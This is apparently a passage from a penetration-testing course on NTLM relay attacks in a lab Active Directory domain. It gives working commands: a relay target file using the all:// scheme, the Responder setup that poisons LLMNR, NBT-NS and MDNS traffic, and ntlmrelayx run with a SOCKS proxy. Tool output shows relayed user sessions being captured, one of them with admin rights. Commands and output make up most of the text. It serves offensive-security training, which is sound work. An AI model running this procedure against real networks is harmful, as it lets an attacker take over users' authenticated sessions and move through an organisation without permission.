## NTLM Relay over All Protocols

`ntlmrelayx` supports the powerful `all` wildcard for target definition; instead of abusing one specific service/user on the relay targets, we can abuse every relayed connection, regardless of the service/user. First, we will modify the relay target definition to use the `all://` scheme:

```
cat relayTargets.txt

all://172.16.117.50
all://172.16.117.60
```

Then, we need to set all of `Responder`’s servers to `Off` and run it to poison broadcast traffic:

```
sed -i '4,18s/= On/= Off/g' Responder.conf
sudo python3 Responder.py -I ens192
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

<SNIP>

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [OFF]
<SNIP>
```

Subsequently, we will run `ntlmrelayx` with the `-socks` option to make it add to its SOCKS server each authenticated session it can establish with the relay targets:

```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening at port 1080
[*] SMB Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
<SNIP>
[*] SMBD-Thread-39: Connection from INLANEFREIGHT/[email protected] controlled, attacking target http://172.16.117.50
[*] SMBD-Thread-40: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smtp://172.16.117.50
[*] SMBD-Thread-41: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/JPEREZ SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-41: Connection from INLANEFREIGHT/[email protected] controlled, attacking target rpc://172.16.117.50
<SNIP>
stopservers
[*] Shutting down HTTP Server
[*] Shutting down SMB Server
[*] Shutting down RAW Server
[*] Shutting down WCF Server
[*] Relay servers stopped
```

After waiting for a while and stopping the relay servers with the `stopservers` command, we will notice that `ntlmrelayx` established various authenticated sessions when using the `socks` command:

```
ntlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.50  INLANEFREIGHT/JPEREZ  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/NPORTS  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/RMONTY  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445
HTTPS     172.16.117.50  INLANEFREIGHT/RMONTY  N/A          1433
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/NPORTS  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/JPEREZ  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445
MSSQL     172.16.117.60  INLANEFREIGHT/RMONTY  N/A          1433
MSSQL     172.16.117.60  INLANEFREIGHT/NPORTS  N/A          1433
MSSQL     172.16.117.60  INLANEFREIGHT/JPEREZ  N/A          1433
MSSQL     172.16.117.60  INLANEFREIGHT/PETER   N/A          1433
```

As we learned earlier in this section, we can abuse these authenticated sessions that `ntlmrelayx` holds in its SOCKS server by tunneling our tools via `proxychains`.